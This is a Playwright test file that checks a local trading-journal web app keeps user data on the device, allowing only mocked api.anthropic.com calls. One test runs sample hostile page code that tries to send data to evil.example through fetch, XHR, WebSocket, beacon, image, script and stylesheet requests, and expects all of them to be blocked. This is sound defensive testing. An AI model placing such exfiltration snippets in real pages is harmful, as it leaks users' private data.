// End-to-end proof that the app sends nothing off the device.
// Every request the page makes is captured at the browser level (below the
// app's own guard), so this test does not trust the code it is testing.
import { test, expect, Page, BrowserContext } from "@playwright/test";

const APP = "http://localhost:4174";
const CSV = "Date,Open,High,Low,Close,Adj Close,Volume\n" + Array.from({ length: 300 }, (_, i) => {
  const d = new Date(Date.UTC(2025, 0, 1) + i * 86400000).toISOString().slice(0, 10);
  const c = 100 + 10 * Math.sin(i / 15) + i * 0.1;
  return `${d},${c - 0.5},${c + 1},${c - 1},${c},${c},${1_000_000 + i * 1000}`;
}).join("\n");

type Hit = { url: string; method: string; body: string; headers: Record<string, string> };

async function capture(context: BrowserContext) {
  const external: Hit[] = [];
  await context.route("**/*", async (route) => {
    const r = route.request();
    if (r.url().startsWith(APP)) return route.continue();
    external.push({ url: r.url(), method: r.method(), body: r.postData() ?? "", headers: r.headers() });
    if (r.url().startsWith("https://api.anthropic.com/")) {
      return route.fulfill({ status: 200, contentType: "application/json", headers: { "access-control-allow-origin": "*" },
        body: JSON.stringify({ content: [{ type: "text", text: "VERDICT: WAIT\nCONFIDENCE: 55\nMocked reply." }] }) });
    }
    return route.abort();
  });
  return external;
}

async function useEveryFeature(page: Page) {
  await page.goto(APP);
  await expect(page.locator(".verdict")).toBeVisible();
  await page.setInputFiles("#file", { name: "secret-holding.csv", mimeType: "text/csv", buffer: Buffer.from(CSV) });
  await expect(page.locator("#ds")).toContainText("SECRET-HOLDING");
  await page.fill("#note", "PRIVATE-NOTE-7731 bought with my bonus");
  await page.click("#log");
  await page.click("nav >> text=Backtest");
  for (const row of await page.locator("tr[data-k]").all()) await row.click();
  await page.click("nav >> text=Journal");
  await expect(page.locator(".jr")).toContainText("PRIVATE-NOTE-7731");
  await page.click("nav >> text=Settings");
  await page.fill("#acct", "987654");
  await page.click("#save");
  await page.click("nav >> text=Privacy");
  await page.click("nav >> text=Analyze");
}

test("default mode: zero requests leave the device across every feature", async ({ page, context }) => {
  const external = await capture(context);
  await useEveryFeature(page);
  page.on("dialog", d => d.accept());
  await page.click("nav >> text=Privacy");
  await page.click("#wipe");
  expect(external, JSON.stringify(external, null, 1)).toEqual([]);
});

test("hostile code inside the page cannot exfiltrate (guard + CSP)", async ({ page, context }) => {
  const external = await capture(context);
  await page.goto(APP);
  const results = await page.evaluate(async () => {
    const out: string[] = [];
    const tryIt = async (name: string, fn: () => unknown) => { try { await fn(); out.push(name + ":sent"); } catch { out.push(name + ":blocked"); } };
    await tryIt("fetch", () => fetch("https://evil.example/steal?d=1"));
    await tryIt("fetch-anthropic-while-off", () => fetch("https://api.anthropic.com/v1/messages", { method: "POST", body: "x" }));
    await tryIt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", "https://evil.example/x"); x.send(); });
    await tryIt("websocket", () => new WebSocket("wss://evil.example/ws"));
    await tryIt("eventsource", () => new EventSource("https://evil.example/sse"));
    out.push("beacon:" + (navigator.sendBeacon("https://evil.example/b", "d") ? "sent" : "blocked"));
    const img = new Image(); img.src = "https://evil.example/pixel.gif?d=1"; document.body.append(img);
    const s = document.createElement("script"); s.src = "https://evil.example/x.js"; document.body.append(s);
    const l = document.createElement("link"); l.rel = "stylesheet"; l.href = "https://evil.example/x.css"; document.head.append(l);
    await new Promise(r => setTimeout(r, 800));
    return out;
  });
  expect(results.every(r => r.endsWith(":blocked")), results.join(", ")).toBe(true);
  expect(external, JSON.stringify(external, null, 1)).toEqual([]);
});

test("Claude mode: only api.anthropic.com, only the market snapshot", async ({ page, context }) => {
  const external = await capture(context);
  await useEveryFeature(page);
  await page.click("nav >> text=Settings");
  await page.check("#cl");
  await page.fill("#key", "sk-ant-test-KEY");
  await page.check("#alias");
  await page.click("#save");
  await page.click("nav >> text=Analyze");
  await page.click("#debate");
  await expect(page.locator(".deb.judge")).toBeVisible();

  expect(external).toHaveLength(3);
  for (const h of external) {
    expect(new URL(h.url).hostname).toBe("api.anthropic.com");
    expect(h.headers["x-api-key"]).toBe("sk-ant-test-KEY");
    for (const secret of ["PRIVATE-NOTE-7731", "987654", "SECRET-HOLDING", "secret-holding", "sk-ant-test-KEY", "journal"]) {
      expect(h.body, `request body leaked "${secret}"`).not.toContain(secret);
    }
    expect(h.body).toContain("ASSET-A");
  }
  // Even with Claude on, other hosts stay blocked.
  const other = await page.evaluate(() => fetch("https://evil.example/").then(() => "sent", () => "blocked"));
  expect(other).toBe("blocked");
  expect(external).toHaveLength(3);
});
